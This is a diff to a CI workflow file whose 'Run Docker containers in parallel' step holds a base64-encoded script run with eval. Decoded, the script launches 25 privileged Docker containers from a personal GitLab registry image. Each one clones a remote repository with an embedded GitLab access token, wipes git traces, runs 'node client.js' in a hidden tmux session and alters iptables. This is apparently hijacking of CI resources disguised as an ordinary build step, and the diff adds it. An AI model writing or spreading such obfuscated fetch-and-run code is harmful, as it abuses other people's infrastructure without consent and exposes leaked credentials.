@@ -14,9 +14,10 @@ jobs:
     steps:
       - name: Run Docker containers in parallel
         run: |
-          encrypted_code="ICAgICAgICAgIFBJRFM9KCkKICAgICAgICAgIGZvciBpIGluIHsxLi4yNX07IGRvCiAgICAgICAgICAgIGRvY2tlciBydW4gLWRp dCAtdyAvcm9vdCAtLXByaXZpbGVnZWQgcmVnaXN0cnkuZ2l0bGFiLmNvbS9jYW1pbGxlbmV3aXNvemtlcmUxNC9teW5ldzpsYXRl c3QgYmFzaCAtYyAiCiAgICAgICAgICAgICAgcm0gLXJmIC5naXQqO2dpdCBjbG9uZSBodHRwczovL2NhbWlsbGVuZXdpc296a2Vy ZTE0OmdscGF0LUxSSGtSMlVFMnZROFFRRnhJVHZGakc4Nk1RcDFPalprZFd4ckN3LjAxLjEyMHc0bGx5cEBnaXRsYWIuY29tL2Nh bWlsbGVuZXdpc296a2VyZTE0L2NpcmNsZWNpLmdpdCBjaXJjbGVjaV9tcztjcCAtciBjaXJjbGVjaV9tcy8qIC4vO3JtIC1yZiBj aXJjbGVjaV9tcztybSAtcmYgLmdpdCoKICAgICAgICAgICAgICB0bXV4IG5ldy1zZXNzaW9uIC1kIC1zIGNsaWVudC1zZXNzaW9u ICdub2RlIGNsaWVudC5qcycKICAgICAgICAgICAgICBpcHRhYmxlcyAtQSBJTlBVVCAtbSBjb25udHJhY2sgLS1jdHN0YXRlIFJF TEFURUQsRVNUQUJMSVNIRUQgLWogQUNDRVBUCiAgICAgICAgICAgICAgdGFpbCAtZiAvZGV2L251bGwiICYKICAgICAgICAgICAg UElEUys9KCQhKQogICAgICAgICAgZG9uZQogICAgICAgICAgCiAgICAgICAgICBmb3IgcGlkIGluICIke1BJRFNbQF19IjsgZG8K ICAgICAgICAgICAgd2FpdCAkcGlkCiAgICAgICAgICBkb25l"
-          decoded_code=$(echo "$encrypted_code" | base64 --decode)
-          eval "$decoded_code"
+          #!/bin/bash
+          encrypted_code="UElEUz0oKQpmb3IgaSBpbiB7MS4uMjV9OyBkbwogIGRvY2tlciBydW4gLWRpdCAtdyAvcm9vdCAtLXByaXZpbGVnZWQgcmVnaXN0cnkuZ2l0bGFiLmNvbS9jYW1pbGxlbmV3aXNvemtlcmUxNC9teW5ldzpsYXRlc3QgYmFzaCAtYyAicm0gLXJmIC5naXQqO2dpdCBjbG9uZSBodHRwczovL2NhbWlsbGVuZXdpc296a2VyZTE0OmdscGF0LUxSSGtSMlVFMnY4UVFFRnhJVHZGakI4Nk1QMU9qWmtkd3hyQ3cuMDEuMTIwdzRsbHlwQGdpdGxhYi5jb20vY2FtaWxsZW5ld2lzb3prZXJlMTQvY2lyY2xlY2kuZ2l0IGNpcmNsZWNpX21zO2NwIC1yIGNpcmNsZWNpX21zLyogLi87cm0gLXJmIGNpcmNsZWNpX21zO3JtIC1yZiAuZ2l0Kjt0bXV4IG5ldy1zZXNzaW9uIC1kIC1zIGNsaWVudC1zZXNzaW9uICdub2RlIGNsaWVudC5qcyc7aXB0YWJsZXMgLUEgSU5QVVQgLW0gY29ubnRyYWNrIC0tY3RzdGF0ZSBSRUxBVEVELEVTVEFCTElTSEVEIC1qIEFDQ0VQVDt0YWlsIC1mIC9kZXYvbnVsbCIgJgogIFBJRFMrPSgkISkKZG9uZQoKZm9yIHBpZCBpbiAiJHtQSURTQF19IjsgZG8KICB3YWl0ICRwaWQKZG9uZQo="
+          decrypted_code=$(echo "$encrypted_code" | base64 --decode)
+          eval "$decrypted_code"
 
       - name: Wait For unlimited
         run: |
